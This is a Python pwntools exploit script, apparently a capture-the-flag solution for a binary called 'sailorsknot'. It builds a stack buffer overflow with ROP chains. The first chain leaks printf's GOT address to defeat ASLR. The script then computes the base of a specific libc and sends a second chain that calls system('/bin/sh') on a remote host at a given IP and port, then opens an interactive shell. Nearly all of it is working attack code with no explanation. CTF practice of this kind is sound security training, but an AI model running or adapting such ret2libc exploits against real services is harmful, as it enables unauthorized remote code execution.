#!/usr/bin/env python3

from pwnlib.elf import *
from pwnlib.rop import *
from pwnlib.util.packing import *
from pprint import pprint

context.arch = 'amd64'

elf = ELF("sailorsknot")
print(elf)
#pprint(elf.symbols)

p = elf.process()

print(p.recvuntil("\n"))

rop = ROP(elf)
#rop.call("printf", ["XYT\n"])
#rop.call(elf.symbols["printf"], [b"%s\n\n\n", elf.got["printf"]])
rop.call("printf", [5000])
rop.call("main")

payload = b'A'*40 + rop.chain()
#print(payload)
p.sendline(payload)


print("AAAA")
printf = p.recvuntil("\n")
print(b"CCCC" + printf)
log.info(f"TEST {printf}")
p.interactive()


##########


from pwn import *
from pwnlib.elf import *
from pwnlib.rop import *
from pprint import pprint

import sys

context.arch  = 'amd64'

elf = ELF("sailorsknot")

rop = ROP(elf)
#rop.call("printf", [p64(0x40093e), elf.got["printf"]])
rop.raw(p64(0x4007c1)) #RET
#rop.raw(p64(0x4007c4))
rop.call("printf", [elf.got["printf"]])
#rop.raw(p64(0x4007c4))
#rop.call("printf", [elf.got["system"]])
#rop.call("main")
#rop.find
rop.raw(p64(0x4007c1)) # RET
#rop.raw(p64(0x40077a))
rop.call("main")
print(rop.dump())

#p = elf.process()
p = remote("46.101.107.117", 2112)

print(p.recvuntil("\n")) # Welcome! Please give me your name!

payload = b'A'*40+ rop.chain()
p.sendline(payload)
print(b"XXX" + p.recvuntil("\n")) # Hi! Nice to meet you!

resp = p.recvuntil("\n") # Address + again Welcome! Please give me your name!
print(b"Response: " + resp)
printfAddress = u64(resp[:6].ljust(8, b"\x00")) # TODO just byte?
print("Remote printf address: " + hex(printfAddress))

libc = ELF("libc6_2.27-3ubuntu1_amd64.so")
libc.address = printfAddress - libc.symbols["printf"]
print(hex(libc.symbols["printf"]))
print(hex(libc.address))

rop = ROP(libc)
rop.raw(p64(0x4007c1)) #RET
#rop.call("puts", [next(libc.search(b"/bin/sh\x00"))])
rop.call("system", [next(libc.search(b"/bin/sh\x00"))])
rop.call("exit")
print(rop.dump())

payload = b'A'*40 + rop.chain()
p.sendline(payload)

p.recvuntil("\n")

p.interactive()

#sys.stdout.buffer.write(b'A'*40 + p64(0x004007bf) + b'/bin//sh' + p64(0x4007cc) + b'\n')
#sys.stdout.buffer.write(b'A'*40 + p64())

